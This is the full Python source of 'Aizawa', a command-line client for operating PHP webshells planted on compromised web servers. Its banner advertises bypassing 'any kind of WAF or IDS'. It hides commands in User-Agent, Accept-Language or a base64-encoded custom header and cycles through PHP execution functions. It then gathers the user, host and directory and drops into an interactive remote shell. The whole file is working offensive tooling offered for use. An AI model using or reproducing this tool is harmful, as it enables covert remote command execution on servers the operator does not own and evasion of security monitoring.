#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################

# Imports


import re
import sys
import httpx
import base64
import asyncio
import validators


# Colors


bold = "\033[1m"
red = "\033[31m"
clear = "\033[0m"
cyan = "\033[36m"
blue = "\033[34m"
purple = "\033[35m"
green = "\033[32m"
yellow = "\033[33m"


# Functions


async def http_request(client, method, url, headers=None, data=None):
    headers = headers or {}
    try:
        if method.lower() == 'post':
            r = await client.post(url, headers=headers, data={'cmd': data})
        elif method.lower() == 'get':
            r = await client.get(url, headers=headers)
        else:
            raise ValueError(
                f"{bold} {yellow} WARNING! {clear}\n{red}ERROR {clear}: Invalid method {method}\n")
        r.raise_for_status()
    except httpx.HTTPStatusError as e:
        print(
            f"{bold} {yellow} WARNING! {clear}\n{red}ERROR {clear}: Error response {e.response.status_code} while making {method} request to {url}")
        return None
    return r.text


def create_headers(user_agent=None, accept_language=None):
    headers = {
        'sec-ch-ua': 'Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': 'Windows',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': accept_language or 'en-US,en;q=0.9'
    }
    return headers


async def http_user_agent_get(client, url, cmd):
    headers = create_headers(cmd, None)
    return await http_request(client, 'get', url, headers)


async def http_accept_language_get(client, url, cmd):
    headers = create_headers(None, cmd)
    return await http_request(client, 'get', url, headers)


async def http_user_agent_post(client, url, data, cmd):
    headers = create_headers(cmd, None)
    return await http_request(client, 'post', url, headers, data)


async def http_accept_language_post(client, url, data, cmd):
    headers = create_headers(None, cmd)
    return await http_request(client, 'post', url, headers, data)


async def http_aizawa_ninja(client, url, cmd):
    headers = create_headers()
    headers["Aizawa-Ninja"] = base64.b64encode(cmd.encode('utf-8'))
    return await http_request(client, 'get', url, headers)


async def execute(client, url, cmd, type):
    match type:
        case "ping":
            try:
                headers = create_headers()
                r = await client.get(url, headers=headers, follow_redirects=True)
                if r.status_code != 200:
                    print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear +
                          ': Invalid HTTP response code\nPlease check the URL and try again\n')
                    sys.exit()
            except httpx.RequestError as e:
                print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' +
                      clear + ': URL is not reachable\nPlease check the URL and try again\n')
                sys.exit()

        case "get":
            headers = create_headers()
            r = await http_request(client, 'get', url+cmd, headers)
            if not r:
                result = red + 'ERROR' + clear + '\n'
            return r

        case "post":
            headers = create_headers()
            r = await http_request(client, 'post', url, headers, data={cmd})
            if not r:
                result = red + 'ERROR' + clear + '\n'
            return r

        case "http_user_agent_get":
            result = await http_user_agent_get(client, url + '?cmd=system', cmd)
            if not result:
                result = await http_user_agent_get(client, url + '?cmd=proc_open', cmd)
            elif not result:
                result = await http_user_agent_get(client, url + '?cmd=popen', cmd)
            if not result:
                result = await http_user_agent_get(client, url + '?cmd=passthru', cmd)
            if not result:
                result = await http_user_agent_get(client, url + '?cmd=shell_exec', cmd)
            if not result:
                result = await http_user_agent_get(client, url + '?cmd=exec', cmd)
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_accept_language_get":
            result = await http_accept_language_get(client, url + '?cmd=system', cmd)
            if not result:
                result = await http_accept_language_get(client, url + '?cmd=proc_open', cmd)
            if not result:
                result = await http_accept_language_get(client, url + '?cmd=popen', cmd)
            if not result:
                result = await http_accept_language_get(client, url + '?cmd=passthru', cmd)
            if not result:
                result = await http_accept_language_get(client, url + '?cmd=shell_exec', cmd)
            if not result:
                result = await http_accept_language_get(client, url + '?cmd=exec', cmd)
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_user_agent_post":
            result = await http_user_agent_post(client, url,'system', cmd)
            if not result:
                result = await http_user_agent_post(client, url, 'proc_open', cmd)
            if not result:
                result = await http_user_agent_post(client, url, 'popen', cmd)
            if not result:
                result = await http_user_agent_post(client, url, 'passthru', cmd)
            if not result:
                result = await http_user_agent_post(client, url, 'shell_exec', cmd)
            if not result:
                result = await http_user_agent_post(client, url, 'exec', cmd)
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_accept_language_post":
            result = await http_accept_language_post(client, url, 'system', cmd)
            if not result:
                result = await http_accept_language_post(client, url, 'proc_open', cmd)
            if not result:
                result = await http_accept_language_post(client, url, 'popen', cmd)
            if not result:
                result = await http_accept_language_post(client, url, 'passthru', cmd)
            if not result:
                result = await http_accept_language_post(client, url, 'shell_exec', cmd)
            if not result:
                result = await http_accept_language_post(client, url, 'exec', cmd)
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

        case "http_aizawa_ninja_eval":
            result = await http_aizawa_ninja(client, url, 'system~' + cmd)
            if not result:
                result = await http_aizawa_ninja(client, url, 'passthru~' + cmd)
            if not result:
                result = await http_aizawa_ninja(client, url, 'shell_exec~' + cmd)
            if not result:
                result = await http_aizawa_ninja(client, url, 'exec~' + cmd)
            if not result:
                result = red + 'ERROR' + clear + '\n'
            return result

    if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter"]:
        result = await http_aizawa_ninja(client, url, cmd)
        if not result:
            result = red + 'ERROR' + clear + '\n'
        return result


def banner():
    banner_text = yellow + '\n   ___   ________  ___ _      _____ \n'
    banner_text += '  / _ | /  _/_  / / _ | | /| / / _ |\n'
    banner_text += ' / __ |_/ /  / /_' + blue + '/ __ | |/ |/ / __ |\n'
    banner_text += '/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|' + clear + '\n'
    banner_text += 'A Super Simple Command Line Webshell\nFor Bypassing Any Kind of WAF or IDS\n'
    banner_text += 'Code by ' + bold + '   @' + red + 'elliottophellia' + clear + '    '
    banner_text += bold + '#' + red + 'V' + purple + 'S' + blue + 'P' + yellow + 'O' + clear + '\n'
    print(banner_text)


async def main():

    # Httpx Client

    async with httpx.AsyncClient(verify=False, http2=True, timeout=None) as client:

        # Get URL and check if valid

        url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
        if not validators.url(url):
            print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear + ': Invalid URL format\nThis does not appear to be a valid URL/IP address\nPlease check the input and try again\n')
            sys.exit()

        # Remove any characters after the file extension

        regex = re.compile(r'^.*\.[a-zA-Z]+', re.MULTILINE)
        remove_char = regex.findall(url)
        url = remove_char[0]

        # Check if URL is alive and reachable

        await execute(client, url, '', 'ping')

        # Get filename and strip the domain

        filename = url[url.rfind('/') + 1:]

        # Classify the webshell type based on the filename

        patterns_to_types = {
            r'get_aizawa_hal_(.*?)\.': 'http_accept_language_get',
            r'get_aizawa_hua_(.*?)\.': 'http_user_agent_get',
            r'post_aizawa_hal_(.*?)\.': 'http_accept_language_post',
            r'post_aizawa_hua_(.*?)\.': 'http_user_agent_post',
            r'aizawa_ninja_eval_(.*?)\.': 'http_aizawa_ninja_eval',
            r'aizawa_ninja_concat_(.*?)\.': 'http_aizawa_ninja_concat',
            r'aizawa_ninja_debug_(.*?)\.': 'http_aizawa_ninja_debug',
            r'aizawa_ninja_gc_(.*?)\.': 'http_aizawa_ninja_gc',
            r'aizawa_ninja_json_(.*?)\.': 'http_aizawa_ninja_json',
            r'aizawa_ninja_filter_(.*?)\.': 'http_aizawa_ninja_filter',
        }

        type = None

        for pattern, t in patterns_to_types.items():
            match = re.findall(pattern, filename)
            if match:
                type = t
                break

        if type is None:
            print(bold + yellow + 'WARNING!' + clear + '\n' + red + 'ERROR' + clear + ': Invalid filename\nThis does not appear to be a valid Aizawa Webshell\nPlease check the URL and try again\n')
            sys.exit()

        # Get essential information

        # Get user and host

        user = await execute(client, url, 'whoami', type)
        host = await execute(client, url, 'hostname', type)
        pwd = await execute(client, url, 'pwd', type)

        # Return default values if not found or error

        user = 'aizawaema' if not user or user == '\033[31mERROR\033[0m\n' else re.sub(
            r'\s+', '', user)
        host = 'virtualesport' if not host or host == '\033[31mERROR\033[0m\n' else re.sub(
            r'\s+', '', host)
        pwd = '~/unknown/path' if not pwd or pwd == '\033[31mERROR\033[0m\n' else re.sub(
            r'\s+', '', pwd)

        # Print essential information
        if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter", "http_aizawa_ninja_eval"]:
            print(bold + green + 'Successfully connected to Aizawa Webshell Ninja Edition!' + clear)
        else:
            print(bold + green + 'Successfully connected to Aizawa Webshell!' + clear + '\n')

            info_commands = {
                "Kernel": "unamea",
                "Server": "server",
                "Safe Mode": "safe_mode",
                "Server IP": "server_ip",
                "Client IP": "client_ip",
                "Disable Function": "disable_functions"
            }

            if type in ["http_accept_language_post", "http_user_agent_post"]:
                method = "post"
            elif type in ["http_accept_language_get", "http_user_agent_get"]:
                method = "get"

            # Calculate the maximum label width
            max_label_width = max(len(label) for label in info_commands.keys())

            for info, command in info_commands.items():
                if method == "get":
                    result = await execute(client, url, f"?{command}", method)
                else:
                    result = await client.post(url, data=command)
                    result = result.text
                formatted_info = f"{info.ljust(max_label_width)} : {result}"
                print(f"{bold}{formatted_info}{clear}")

        # Initialize the shell

        while True:

            # Get command from user

            cmd = input('\n' + bold + yellow + user + clear + '@' + bold + blue + host + clear + ' ' + purple + pwd + clear + ' % ')
            if cmd == 'exit' or cmd == 'quit' or cmd == '\x03':
                sys.exit()
            if not cmd:
                continue

            # Execute command and print result

            print('\n' + cyan + await execute(client, url, cmd, type) + clear)


if __name__ == "__main__":

    # Print banner
    banner()

    # Run the script
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nCtrl + C detected. Exiting...")
